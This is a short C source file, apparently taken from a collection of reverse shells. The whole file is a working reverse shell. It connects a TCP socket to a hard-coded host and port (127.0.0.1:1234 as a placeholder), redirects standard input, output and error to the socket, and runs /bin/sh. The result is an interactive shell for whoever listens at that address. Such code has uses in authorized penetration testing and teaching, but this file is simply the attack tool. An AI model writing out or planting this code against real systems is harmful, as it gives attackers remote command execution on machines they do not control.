// https://github.com/loneicewolf/ReverseShells
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#define RP 1234
#define RH "127.0.0.1"
#define BIN "/bin/sh"
int main(){
int is = 0;is = socket(AF_INET,SOCK_STREAM,0);
struct sockaddr_in s1;
s1.sin_family      = AF_INET;
s1.sin_port        = htons(RP);
s1.sin_addr.s_addr = inet_addr(RH);
connect( is,(struct sockaddr *) &s1,sizeof(s1));
for(int i=0;i<3;dup2(is,i),i++);
char * const argv[] = {BIN,NULL};
execve(BIN, argv, NULL);
return 0;}
